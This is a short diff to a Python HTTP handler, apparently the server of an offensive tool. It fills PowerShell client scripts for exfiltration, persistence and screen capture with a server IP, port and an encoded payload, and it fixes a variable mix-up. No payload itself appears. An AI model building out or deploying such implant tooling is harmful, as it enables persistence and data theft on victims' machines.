@@ -53,7 +53,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                 file_to_open = file_to_open.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
                 file_to_open = file_to_open.replace('SERVER_PROTOCOL',PROTOCOL)
                 file_to_open2 = open('scripts/client_pers.ps1','r').read()
-                file_to_open2 = file_to_open.replace('BASE64_ENCODED_PAYLOAD_UTF16LE',config.persistence['BASE64_ENCODED_PAYLOAD_UTF16LE'])
+                file_to_open2 = file_to_open2.replace('BASE64_ENCODED_PAYLOAD_UTF16LE',config.persistence['BASE64_ENCODED_PAYLOAD_UTF16LE'])
                 file_to_open3 = open('scripts/client_screen.ps1','r').read()
                 file_to_open3 = file_to_open3.replace('SERVER_EXTERNAL_IP',config.exfiltration['SERVER_EXTERNAL_IP'])
                 file_to_open3 = file_to_open3.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
